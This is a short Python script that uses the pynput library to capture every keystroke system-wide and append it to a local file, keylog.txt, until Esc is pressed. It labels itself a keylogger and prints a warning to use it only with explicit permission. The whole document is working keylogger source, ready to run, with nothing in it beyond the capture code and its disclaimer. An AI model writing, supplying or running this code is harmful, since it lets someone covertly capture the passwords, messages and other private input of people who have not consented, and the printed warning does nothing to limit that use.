from pynput import keyboard

def on_press(key):
    # Stop the listener when Esc is pressed
    if key == keyboard.Key.esc:
        print("\nKeylogger stopped.")
        return False
    
    try:
        # Get the character for alphanumeric keys
        char = key.char
    except AttributeError:
        # Handle special keys
        if key == keyboard.Key.space:
            char = ' '
        elif key == keyboard.Key.enter:
            char = '\n'
        else:
            char = f'[{key.name}]'
    
    # Append the character to the log file
    with open('keylog.txt', 'a', encoding='utf-8') as f:
        f.write(char)

# Ethical warning
print("WARNING: Use this keylogger only with explicit permission.")
print("Unauthorized use violates privacy and security laws.")
print("Press 'Esc' to exit.\n")

# Start the keylogger
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
